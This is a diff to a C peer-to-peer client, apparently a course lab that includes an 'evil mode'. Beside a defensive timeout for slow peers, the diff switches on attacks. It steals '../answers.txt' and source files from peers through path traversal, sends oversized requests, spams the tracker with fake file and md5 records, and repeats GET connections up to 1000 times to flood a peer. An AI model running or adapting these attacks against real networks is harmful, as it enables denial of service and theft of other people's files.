@@ -22,6 +22,7 @@
 #include <limits.h>
 #include "md5.h"
 #include "osp2p.h"
+#include <sys/poll.h>
 
 #define DEBUG 1
 
@@ -44,6 +45,8 @@ const char *myalias;
 
 #define DOWNLOAD_RETRY 3    // time interval between download retries (sec.)
 #define MAX_RETRY 3         // number of times to retry download
+#define TIMEOUT 500			// max acceptable ms between download chunks
+#define DDOSNUM 1000		// number of DDOS download entries
 
 typedef enum tasktype {		// Which type of connection is this?
 	TASK_TRACKER,		// => Tracker connection
@@ -630,6 +633,39 @@ exit:
 }
 
 
+static int ddos_download(task_t *t, task_t *tracker_task)
+{
+	int i, ret = -1;
+	assert((!t || t->type == TASK_DOWNLOAD)
+	       && tracker_task->type == TASK_TRACKER);
+	
+	// Quit if no peers, and skip this peer
+	if (!t || !t->peer_list) {
+		error("* No peers are willing to serve '%s'\n",
+		      (t ? t->filename : "that file"));
+		task_free(t);
+		return DOWNLOAD_NO_PEER;
+	} else if (t->peer_list->addr.s_addr == listen_addr.s_addr
+			   && t->peer_list->port == listen_port)
+		return 0;
+	
+	int ddos = 0;
+	// Connect to the peer and write the GET command
+	do {
+		message("* [%i] Connecting to %s %s:%d to download '%s'\n", ddos, t->peer_list->alias,
+				inet_ntoa(t->peer_list->addr), t->peer_list->port,
+				t->filename);
+		t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+		if (t->peer_fd == -1) {
+			error("* Cannot connect to peer: %s\n", strerror(errno));
+			return 0;
+		}
+		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+		ddos++;
+	} while (ddos < DDOSNUM);
+	return 0;
+}
+
 // task_download(t, tracker_task)
 //	Downloads the file specified by the input task 't' into the current
 //	directory.  't' was created by start_download().
@@ -651,16 +687,20 @@ static int task_download(task_t *t, task_t *tracker_task)
 		   && t->peer_list->port == listen_port)
 		goto try_again;
 
+	int ddos = 0;
 	// Connect to the peer and write the GET command
-	message("* Connecting to %s %s:%d to download '%s'\n", t->peer_list->alias,
-		inet_ntoa(t->peer_list->addr), t->peer_list->port,
-		t->filename);
-	t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
-	if (t->peer_fd == -1) {
-		error("* Cannot connect to peer: %s\n", strerror(errno));
-		goto try_again;
-	}
-	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+	do {
+		message("* [%i] Connecting to %s %s:%d to download '%s'\n", ddos, t->peer_list->alias,
+				inet_ntoa(t->peer_list->addr), t->peer_list->port,
+				t->filename);
+		t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+		if (t->peer_fd == -1) {
+			error("* Cannot connect to peer: %s\n", strerror(errno));
+			goto try_again;
+		}
+		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+		ddos++;
+	} while (evil_mode == 1 && ddos < 1000);
 
 	// Open disk file for the result.
 	// If the filename already exists, save the file in a name like
@@ -693,6 +733,13 @@ static int task_download(task_t *t, task_t *tracker_task)
 		return DOWNLOAD_TOO_MANY_LOCAL;
 	}
 
+	
+	// Setup for avoiding extremely slowly uploading peers
+	struct pollfd p;
+	int pollr;
+	p.fd = t->peer_fd;
+	p.events = POLLIN | POLLERR | POLLHUP | POLLNVAL;
+	
 	// Read the file into the task buffer from the peer,
 	// and write it from the task buffer onto disk.
 	while (1) {
@@ -700,6 +747,13 @@ static int task_download(task_t *t, task_t *tracker_task)
 			error("* Error: file [%s] exceeded size limit [%i bytes]! \n", t->filename, MAXFILESIZ);
 			goto try_again;
 		}
+		
+		pollr = poll(&p, 1, TIMEOUT);
+		if (pollr == 0) {
+			error("* Download '%s' too slow; moving onto next peer\n", t->filename);
+			goto try_again;
+		}
+		
 		int ret = read_to_taskbuf(t->peer_fd, t);
 		if (ret == TBUF_ERROR) {
 			error("* Peer read error");
@@ -930,7 +984,7 @@ static void upload_files (task_t *listen_task) {
 							task_upload(t);
 							exit(0);
 						} else if (child < 0) {
-							error("* Unable to generate child process!\n");
+							error("* upload_files: Unable to generate child process!\n");
 						}
 					}
 				}
@@ -981,7 +1035,7 @@ static void overload_request(task_t *tracker_task) {
 // spam the tracker md5 record using filenames from a dictionary file
 // generates "count" number of spam entries for each word in dictionary 
 static void spam_md5(task_t *tracker_task, const char* dictionary, int count) {
-	message("* Spam tacker with filenames and md5 values\n");
+	message("* Spam tracker with filenames and md5 values\n");
 
 	int i;
 	char filename[80];
@@ -999,12 +1053,14 @@ static void spam_md5(task_t *tracker_task, const char* dictionary, int count) {
 		sprintf(filename, "%s.jpg", name);
 		osp2p_writef(tracker_task->peer_fd, "HAVE %s %s\n",
 			     filename, "Q3mAe3djcNCDKaXVj3AF7c");
+		osp2p_writef(tracker_task->peer_fd, "DONTHAVE %s \n", filename);
 		(void) read_tracker_response(tracker_task);
 
 		for(i=1;i<=count;i++) {
 			sprintf(filename, "%s%d.jpg", name, i);
 			osp2p_writef(tracker_task->peer_fd, "HAVE %s %s\n",
 				     filename, "Q3mAe3djcNCDKaXVj3AF7c");
+			osp2p_writef(tracker_task->peer_fd, "DONTHAVE %s \n", filename);
 			(void) read_tracker_response(tracker_task);
 			usleep(1000);
 		}
@@ -1027,6 +1083,19 @@ int main(int argc, char *argv[])
 	struct passwd *pwent;
 	pid_t child;
 
+
+	// Default tracker is read.cs.ucla.edu
+	osp2p_sscanf("131.179.80.139:11111", "%I:%d",
+				 &tracker_addr, &tracker_port);
+	if ((pwent = getpwuid(getuid()))) {
+		myalias = (const char *) malloc(strlen(pwent->pw_name) + 20);
+		sprintf((char *) myalias, "%s%d", pwent->pw_name,
+				(int) time(NULL));
+	} else {
+		myalias = (const char *) malloc(40);
+		sprintf((char *) myalias, "osppeer%d", (int) getpid());
+	}
+	
 	// Ignore broken-pipe signals: if a connection dies, server should not
 	signal(SIGPIPE, SIG_IGN);
 
@@ -1077,24 +1146,6 @@ int main(int argc, char *argv[])
 		exit(0);
 	}
 	
-	// Default tracker is read.cs.ucla.edu
-	osp2p_sscanf("131.179.80.139:11111", "%I:%d",
-				 &tracker_addr, &tracker_port);
-	if ((pwent = getpwuid(getuid()))) {
-		if (evil_mode) {
-			myalias = (const char *) malloc(strlen(pwent->pw_name) + 25);
-			sprintf((char *) myalias, "%s%d%s", pwent->pw_name,
-					(int) time(NULL), "-evil");
-		} else {
-			myalias = (const char *) malloc(strlen(pwent->pw_name) + 20);
-			sprintf((char *) myalias, "%s%d", pwent->pw_name,
-					(int) time(NULL));
-		}
-	} else {
-		myalias = (const char *) malloc(40);
-		sprintf((char *) myalias, "osppeer%d", (int) getpid());
-	}
-	
 	message("* MyAlias: %s\n", myalias);
 
 	// Connect to the tracker and register our files.
@@ -1128,16 +1179,22 @@ int main(int argc, char *argv[])
 	
 	if (evil_mode) {
 		srand(time(NULL));
-		message("* Evil mode\n");
-		// Thievery: steal other users' answers file
-		//steal_file(tracker_task, "../answers.txt");
-		//steal_file(tracker_task, "../osppeer.c");
-		
-		// Send an oversized filename request from all peers
-		//overload_request(tracker_task);
-		
-		// TODO: spam bad md5sum values to tracker
-		spam_md5(tracker_task, "../animals.txt", 10);
+		child = fork();
+		if (child == 0) {
+			message("* Evil mode\n");
+			// Thievery: steal other users' answers file
+			steal_file(tracker_task, "../answers.txt");
+			steal_file(tracker_task, "../osppeer.c");
+			
+			// Send an oversized filename request from all peers
+			overload_request(tracker_task);
+			
+			// TODO: spam bad md5sum values to tracker
+			spam_md5(tracker_task, "../animals.txt", 10);
+			exit(0);
+		} else if (child < 0) {
+			die("* Error creating child process!\n");
+		}
 	}
 	
 	// Parent serves upload requests
